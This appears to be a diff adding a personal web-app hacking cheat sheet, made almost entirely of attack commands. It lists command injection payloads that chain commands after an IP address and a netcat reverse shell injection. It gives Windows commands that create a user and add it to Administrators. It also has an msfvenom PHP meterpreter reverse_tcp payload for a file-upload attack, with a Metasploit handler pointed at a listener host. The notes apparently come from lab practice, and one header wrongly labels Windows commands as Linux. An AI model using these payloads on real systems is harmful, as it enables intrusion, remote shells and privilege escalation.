@@ -1,0 +1,33 @@
+Web app hacking:
+Command injection:[Linux]
+127.0.0.1 && ls
+127.0.0.1 & ls
+127.0.0.1 ; ls
+127.0.0.1 | ls
+nc -nlvp 9001
+127.0.0.1 && nc -c sh 127.0.0.1 9001
+
+Command Injection: [Linux]
+Hostname
+Whoami
+Tasklist
+Taskkill /PID 3112 /F //forcefully kills the processes
+dir c:\
+net user
+net user test /add //add a new user
+net localgroup Administrators test /add //add test user to administrators
+net user test //to view the details of the user
+dir c:\ "pin.txt" or this command ! Take pin.txt //to get content
+type c:\"pin.txt“ //to get the content of a file
+
+File upload :
+msfvenom -p php/meterpreter/reverse_tcp LHOST=192.168.149.130 LPORT=5555 -f raw -o upload.php
+msfconsole
+use exploit/multi/handler
+show options
+set LPORT 5555
+set LHOST 192.168.149.130
+run
+
+nc -nlvp 1234
+upload shell.php
